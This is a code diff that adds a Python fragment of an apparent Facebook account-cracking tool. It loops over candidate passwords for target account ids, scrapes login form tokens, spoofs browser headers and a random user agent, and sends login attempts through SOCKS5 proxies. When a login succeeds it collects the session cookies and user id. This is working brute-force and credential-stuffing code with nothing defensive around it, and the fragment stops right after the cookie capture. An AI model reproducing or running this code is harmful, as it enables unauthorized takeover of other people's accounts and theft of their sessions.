@@ -1,1 +1,76 @@
-
+for pas in pasx:
+            if "RANDOM" in system:
+                pas = rmpassconf(ids,pas)
+            fb = random.choice(["touch","mbasic","m"])
+            free_fb = ses.get('https://web.facebook.com/login/device-based/regular/login/').text
+            proxs = {'http': f'socks5://{prox}'}
+            lgnjs = extract_value('name="lgnjs" value="(.*?)"', free_fb)
+            lgnrnd = extract_value('name="lgnrnd" value="(.*?)"', free_fb)
+            lgndim = extract_value('name="lgnrnd" value="(.*?)"', free_fb)
+            lsd = extract_value('name="lsd" value="(.*?)"', free_fb)
+            jazoest = extract_value('name="jazoest" value="(.*?)"', free_fb)
+            m_ts = extract_value('name="m_ts" value="(.*?)"', free_fb)
+            try_number = extract_value('name="try_number" value="(.*?)"', free_fb)
+            unrecognized_tries = extract_value('name="unrecognized_tries" value="(.*?)"', free_fb)
+            initial_request_id = extract_value('name="initial_request_id" value="(.*?)"', free_fb)
+            li = extract_value('name="li" value="(.*?)"', free_fb)
+            pdr = f'#PWD_FB4A:0:{round(time.time())}:{pas}'
+            data = {
+  "jazoest": jazoest,
+  "lsd": lsd,
+  "display": "",
+  "isprivate": "",
+  "return_session": "",
+  "skip_api_login": "",
+  "signed_next": "",
+  "trynum": "1",
+  "timezone": "-360",
+  "lgndim": lgndim,
+  "lgnrnd": lgnrnd,
+  "lgnjs": lgnjs,
+  "shared_prefs_data": "eyIzMDAwMCI6W3sidCI6MTc0MTU4MzY1Ny41NTQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NDE1ODM2NTcuNTU0LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vIn0sInYiOjB9XSwiMzAwMDIiOlt7InQiOjE3NDE1ODM2NTcuNTU0LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vIn0sInYiOjB9XSwiMzAwMDMiOlt7InQiOjE3NDE1ODM2NTcuNTU0LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vIn0sInYiOlsiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzQxNTgzNjU3LjU1NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luLyJ9LCJ2IjozMDB9XSwiMzAwMDUiOlt7InQiOjE3NDE1ODM2NTcuNTU0LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vIn0sInYiOnsidyI6OTgwLCJoIjoxODY5fX1dLCIzMDAwNyI6W3sidCI6MTc0MTU4MzY1Ny41NTQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzQxNTgzNjU3LjU3OSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc0MTU4MzY1Ny41NTYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc0MTU4MzY1Ny41NTYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi8ifSwidiI6IjUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzMuMC4wLjAgU2FmYXJpLzUzNy4zNiJ9XSwiMzAwMTUiOlt7InQiOjE3NDE1ODM2NTcuNTU2LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vIn0sInYiOiJMaW51eCBhcm12ODEifV0sIjMwMDE4IjpbeyJ0IjoxNzQxNTgzNjU3LjU1NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luLyJ9LCJ2Ijo4fV0sIjMwMDIyIjpbeyJ0IjoxNzQxNTgzNjU3LjU2MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzQxNTgzNjU3LjU2MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luLyJ9LCJ2IjotMzYwfV0sIjMwMDkzIjpbeyJ0IjoxNzQxNTgzNjU3LjU2MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luLyJ9LCJ2Ijo1fV0sIjMwMDk0IjpbeyJ0IjoxNzQxNTgzNjU3LjU2MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzQxNTgzNjU3LjU2MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luLyJ9LCJ2IjoyMn1dLCIzMDEwNiI6W3sidCI6MTc0MTU4MzY1Ny41NDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi8ifSwidiI6ZmFsc2V9LHsidCI6MTc0MTU4MzY1OC4zNDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDEwNyI6W3sidCI6MTc0MTU4MzY1Ny41NDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi8ifSwidiI6ZmFsc2V9LHsidCI6MTc0MTU4MzY1OC4yNzYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi8ifSwidiI6dHJ1ZX1dfQ==",
+  "email": ids,
+  "prefill_contact_point": ids,
+  "prefill_source": "browser_dropdown",
+  "prefill_type": ids,
+  "first_prefill_source": "browser_dropdown",
+  "first_prefill_type": ids,
+  "had_cp_prefilled": "true",
+  "had_password_prefilled": "false",
+  "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAC",
+  "encpass": pdr,
+}
+            headers = {
+  "authority": "web.facebook.com",
+  "method": "POST",
+  "path": "/login/device-based/regular/login/?login_attempt=1&lwv=100",
+  "scheme": "https",
+  "content-length": str(len(str(data))),
+  "cache-control": "max-age=0",
+  "sec-ch-ua": "\"Not(A:Brand\";v=\"99\", \"Google Chrome\";v=\"133\", \"Chromium\";v=\"133\"",
+  "sec-ch-ua-mobile": "?0",
+  "sec-ch-ua-platform": "\"Linux\"",
+  "save-data": "on",
+  "origin": "https://web.facebook.com",
+  "content-type": "application/x-www-form-urlencoded",
+  "upgrade-insecure-requests": "1",
+  "user-agent": waxaa(),
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+  "sec-fetch-site": "same-origin",
+  "sec-fetch-mode": "navigate",
+  "sec-fetch-user": "?1",
+  "sec-fetch-dest": "document",
+  "referer": "https://web.facebook.com/login/device-based/regular/login/",
+  "accept-encoding": "gzip, deflate, br, zstd",
+  "accept-language": "en-US,en;q=0.9",
+  "priority": "u=0, i"
+}
+            params = {
+  "login_attempt": "1",
+  "lwv": "100"
+}
+            res = ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100",params=params, data=data, headers=headers, proxies=proxs)
+            if "c_user" in ses.cookies.get_dict().keys():
+                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                cok = ses.cookies.get_dict()
+                uid = cok["c_user"]
